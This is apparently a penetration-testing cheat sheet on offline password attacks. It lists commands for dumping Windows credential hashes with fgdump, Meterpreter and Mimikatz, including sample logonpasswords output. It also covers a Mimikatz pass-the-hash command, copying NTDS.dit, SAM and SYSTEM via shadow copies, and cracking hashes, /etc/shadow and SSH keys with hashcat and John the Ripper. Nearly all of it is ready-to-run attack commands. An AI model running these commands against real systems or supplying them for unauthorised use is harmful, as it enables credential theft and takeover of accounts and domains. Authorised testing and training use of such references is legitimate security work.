# Offline Attack

## Extracting Password Hashes from Windows

### fgdump

Run fgdump to dump local hash

```text
 fgdump.exe
```

### Meterpreter's Hashdump

```text
meterpreter > hashdump
```

### Mimikatz

```text
PS C:\temp\mimikatz> .\mimikatz
```

* get debug rights \(this or Local System rights is required for many Mimikatz commands\).
* by default, the Administrators group has Debug rights. Debug still has to be “activated” by running “privilege::debug”.

```text
mimikatz # privilege::debug
```

* lists all available provider credentials. This usually shows recently logged on user and computer credentials.
* Services running with account credentials are also dumped using this command.
* Note that only services that are running \(credentials in memory\) can be dumped in this manner.

```text
mimikatz # sekurlsa::logonpasswords
```

```text
Authentication Id : 0 ; 646260 (00000000:0009dc74)
 Session           : RemoteInteractive from 2
 User Name         : adsadministrator
 Domain            : ADSECLAB
 Logon Server      : ADSDC03
 Logon Time        : 11/27/2015 11:41:27 AM
 SID               : S-1-5-21-1581655573-3923512380-696647894-500
 msv :
 [00000003] Primary
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 [00010000] CredentialKeys
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 tspkg :
 wdigest :
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * Password : (null)
 kerberos :
 * Username : adsadministrator
 * Domain   : LAB.ADSECURITY.ORG
 * Password : (null)
 ssp :   KO
 credman :
```

#### Pass the Hash with Mimikatz

If you can’t crack the hash of a local administrator account you can instead just inject the hash into memory to gain the privileges:

```text
sekurlsa::pth /user:Administrator /domain:{domain name} /ntlm:{ntlm hash here} /run:cmd
```

### Volume Shadow Copy Services to copy ntds.dit

```text
cscript vssown.vbs /start
cscript vssown.vbs /create
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\NTDS.dit c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SAM c:\
```

## Hash identification

There are generally speaking three pieces of data we can use to identify a hash.

* The length of the hash
* The character set
* Any special characters

We can use hash-identifier to identify the hash algorithm from the hashed password.

`hash-identifier`

## Cracking the Password

### Hashcat

Put the hashed password file \(test.hash\) and dictionary \(rockyou.txt\) in the same directory and execute the below command:

> `hashcat -m 100 test.hash rockyou.txt`  
> `-m`  
> `-m 100`

### John the ripper \(\*\)

Use the program "unshadow" which is included in John the Ripper to convert obtained /etc/passwd and /etc/shadow files to a combined file for John \(e.g. crackme.txt below\)

```text
unshadow /etc/passwd /etc/shadow >> crackme.txt
```

Cracking the file generated by unshadow \(**crackme.txt**\) using the wordlist **rockyou.txt** using a dictionary/wordlist brute-force

```text
john crackme.txt --wordlist=rockyou.txt
```

Convert an encrypted SSH key to a format readable by John

```text
ssh2john encrypted-key >> crackme-ssh
```

Cracking the file generated by ssh2john \(**crackme-ssh**\) using the wordlist **rockyou.txt** using a dictionary/wordlist brute-force

```text
john crackme-ssh --wordlist=rockyou.txt
```

Crack MD5 hashes that are in a file called hashes using a dictionary/wordlist brute-force

```text
john--format=md5 hashes --wordlist=rockyou.txt
```

John configuration file

* Linux

  ```text
  john.conf
  ```

* Windows

  ```text
  john.ini
  ```

`john.pot` file is where the cracking results stored.

```text
john --show [password_file]
```

john.rec is the recovery file in the event of a crash. To restore cracking

```text
john --restore
```

